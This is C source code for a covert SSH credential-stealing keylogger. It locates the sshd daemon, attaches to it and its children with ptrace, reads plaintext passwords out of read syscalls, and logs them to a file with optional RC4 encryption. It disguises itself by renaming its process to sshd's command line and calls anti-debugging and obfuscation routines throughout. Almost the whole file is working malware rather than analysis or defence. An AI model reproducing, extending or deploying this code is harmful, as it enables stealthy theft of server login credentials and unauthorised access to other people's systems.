#include <stdlib.h>
#include <stdio.h>
#include <sys/ptrace.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
#include "syscalls.h"
#include <dirent.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>

#include "config.h"
#include "common.h"
#include "antidebug.h"
#include "rc4.h"

#if KEYLOGGER
pid_t pid = 0;
int attached = 0;
#if ! STANDALONE
int useRc4 = 0;
rc4_ctx rc4_crypt;
#endif 

void attach(){
    int status;
    if (ptrace(PTRACE_ATTACH, pid, 0, 0) == -1){
        debug("[!] Can't attach pid %d\n", pid); fflush(stdout);
        exit (-1);
    }
    attached = 1;
    waitpid(pid, &status, 0);
    debug("[*] Attached to pid %d.\n", pid); fflush(stdout);
}

void detach(){
    int status;
    if (ptrace(PTRACE_DETACH, pid , 0, 0) == -1){
        debug("[!] can't dettach pid %d\n", pid); fflush(stdout);
        exit (-1);
    }
    attached = 0;
    waitpid(pid, &status, 0);
    debug("[*] Dettached.\n"); fflush(stdout);
}

void quit(char *msg, int ret){
    debug("%s\n", msg); fflush (stdout);
    if (attached) detach();
    exit (ret);
}

int check_ssh_password(unsigned char *buff, int len){
	// Password string is | uint | chars |
	if (len > 32 || len < 5) return 0;

    // ptr points to the last char of the string
	unsigned char *ptr = buff+len-1;
	//debug("buff: %p, ptr: %p, len: %d\n", buff, ptr, len);
	
	while (*ptr != 0x00) ptr--;
	//debug("ptr: %p\n", ptr);

	antidebug_obfuscate_analysis(11);
	// Now we must have two bytes 0x00 at left and one < 0x0f at right
	//debug("*ptr+1: 0x%02x, ptr-1: 0x%02x, ptr-2: 0x%02x\n", *(ptr+1), *(ptr-1), *(ptr-2)); fflush(stdout);
	if ( *(ptr-1) != 0x00 || *(ptr-2) != 0x00) return 0;
	//if (*(ptr+1) > 0x0f || *(ptr-1) != 0x00 || *(ptr-2) != 0x00) return;

	// Now bytes from ptr+2 to buff+len-1 has to be exactly *ptr+1
	//debug("%d\n", buff+len-1-ptr);
	if (((buff+len-1)-(ptr+1)) != *(ptr+1)) return 0;

#if ! STANDALONE
    if (useRc4) {
        // xifrar rc4
        rc4_init((unsigned char *)RC4KEY, sizeof(RC4KEY), &rc4_crypt);
        rc4(ptr+2, *(ptr+1), &rc4_crypt);
    }
#endif
    write(1, ptr+2, *(ptr+1));

    putchar('\n');
    return 1;
}

int sshdPid(char *cmdline) {
	struct dirent *de;
    char statusPath[32];
    FILE *statusFile;
    int sshdPid = 0;
    int sshdPpid = 0;
    int fd = 0;
    char sshdState;

	DIR *proc = opendir("/proc");
	if (!proc) {
		quit("opendir error", 0);
	}
	antidebug_obfuscate_analysis(9);
	while ((de=readdir(proc))) {
        sprintf(statusPath, "/proc/%s/stat", de->d_name);
        statusFile = fopen(statusPath, "r");
        if (statusFile) {
            if (fscanf(statusFile, "%d (sshd) %c %d", &sshdPid, &sshdState, &sshdPpid) == 3 && sshdPpid == 1) {
                debug("sshd pid: %d\n" ,sshdPid);
                fclose(statusFile);
				antidebug_obfuscate_analysis(10);
                sprintf(statusPath, "/proc/%s/cmdline", de->d_name);
                fd = open(statusPath, O_RDONLY);
                read(fd, cmdline, 64);
                close(fd);
                return sshdPid;
            }
            fclose(statusFile);
        } 
    }
    return 0;
}

void mread(long int addr, long int size, int *dest){
    int i = 0;
    size = (size % 4) ? size/4 + 1 : size/4;
    memset(dest, 0, size);
    errno = 0;
	antidebug_obfuscate_analysis(8);
    for (i = 0; i < size; i++) {
        dest[i] = ptrace(PTRACE_PEEKTEXT, pid, addr+i*4,0);
        if(errno != 0) {
            debug(" => 0x%lx ",addr+i);fflush(stdout);
            errno = 0;
        }
    }
}
 
void lookForReads(pid_t eax) {
    long orig_eax;
    int status;
    int insyscall = 0;
    struct pt_regs regs;
    pid = eax;
    
    attach();
    while(1) {
        ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
        wait(&status);

		antidebug_obfuscate_analysis(7);
        if(WIFEXITED(status) || (WIFSTOPPED(status) && WSTOPSIG(status) != SIGTRAP && WSTOPSIG(status) != SIGCHLD) ) {
            debug("Acabant procés %d %x\n", pid, status);
            if (WSTOPSIG(status)) kill(pid, WSTOPSIG(status));
            break;
        }
        orig_eax = ptrace(PTRACE_PEEKUSER, pid, 4 * ORIG_EAX, NULL);

        if ( orig_eax == __NR_read) {
                if(insyscall == 0) {
                    insyscall = 1;
                    ptrace(PTRACE_GETREGS, pid, NULL, &regs);
                }
                else {
                    insyscall = 0;
                    eax = ptrace(PTRACE_PEEKUSER, pid, 4 * EAX, NULL);
					antidebug_obfuscate_analysis(6);
                    if (eax > 5 && eax < 32) {
                        unsigned char pass[64];
                        memset(pass, 0, 64);
                        mread(regs.ecx, eax, (int *)pass);
                        // +3 because mread overflows 3 bytes
                        check_ssh_password(pass, eax);
                    }
                }
        }
    }
    exit(0);
}

void rename_proc2name(int argc, char **argv, char *newname) {
	antidebug_obfuscate_analysis(1);
	int i;

	for (i = 0; i < argc; i++) {
	    memset(argv[i], 0, strlen(argv[i]));
	    realloc(argv[i], strlen(newname)+1);
	    memset(argv[i], 0, strlen(newname)+1);
	}
	memcpy(argv[0], newname, strlen(newname));
}

int main_keylogger(int argc, char **argv, char *file) {
    char procName[64];
    char *logFile = 0;
    long orig_eax;
    pid_t eax;
    int status;
    int insyscall = 0;
    struct pt_regs regs;
    int exitPid;
    int fd = 0;

	setsid();

	antidebug_obfuscate_analysis(2);
	antidebug_sigtrap()
    // Buscar pid del proces sshd
	pid = sshdPid(procName);
    if (!pid) {
        debug("sshd no trobat, sortint...\n");
        exit(0);
    }

    // Canviar el nom del procés a cmdline del sshd
	rename_proc2name(argc, argv, procName);

#if ! STANDALONE
    if (file) {
        logFile = file;
        useRc4 = 1;
    }
#endif

    // Open logfile
    if (logFile != 0) {
        debug("Oppening file %s\n", logFile);
        fd = open(logFile, O_RDWR|O_CREAT, S_IRWXU);
        if (!fd) exit(0);
        lseek(fd, 0, SEEK_END);
        dup2(fd, 1);
    } else {
        debug("Not oppening a file log\n");
    }

    // Procés pare que per cada clone, crea un fill
    attach();
    while(1) {
        ptrace(PTRACE_SYSCALL, pid, NULL, NULL);
        exitPid = wait(&status);

        antidebug_obfuscate_analysis(3);
        if (WIFSTOPPED(status)) {
            if (WSTOPSIG(status) == SIGCHLD) {
                ptrace(PTRACE_CONT, pid, 0, SIGCHLD);
                kill(pid, SIGSTOP);
            } else 
                if (WSTOPSIG(status) != SIGTRAP &&  WSTOPSIG(status) != SIGSTOP) {
                ptrace(PTRACE_CONT, pid, 0, WSTOPSIG(status));
                debug("Acabant procés pare %d (%d)\n", pid, WSTOPSIG(status));
                break;
            }
            else {
                orig_eax = ptrace(PTRACE_PEEKUSER, pid, 4 * ORIG_EAX, NULL);

                antidebug_obfuscate_analysis(4);
                switch (orig_eax) {
                    case __NR_clone:
                        if(insyscall == 0) {
                            debug("fork\n");
                            insyscall = 1;
                        } else {
                            insyscall = 0;
                            eax = ptrace(PTRACE_PEEKUSER, pid, 4 * EAX, NULL);
                            if(!fork()) {
                                lookForReads(eax);
                            }
                        }
                        break;
                    case __NR_read:
                        if(insyscall == 0) {
                            debug("read\n");
                            insyscall = 1;
                            ptrace(PTRACE_GETREGS, pid, NULL, &regs);
                        }
                        else {
                            insyscall = 0;
                            antidebug_obfuscate_analysis(5);
                            eax = ptrace(PTRACE_PEEKUSER, pid, 4 * EAX, NULL);
                            if (eax > 5 && eax < 32) {
                                unsigned char pass[64];
                                memset(pass, 0, 64);
                                mread(regs.ecx, eax, (int *)pass);
                                // +3 because mread overflows 3 bytes
                                check_ssh_password(pass, eax);
                            }
                        }
                        break;
                }
            }
        }
    }

	detach();
	killpg(0, 15);
	return 0;
}

#if STANDALONE 
int main(int argc, char **argv) {
	main_keylogger(argc, argv, 0);
	return 0;
}
#endif
#endif
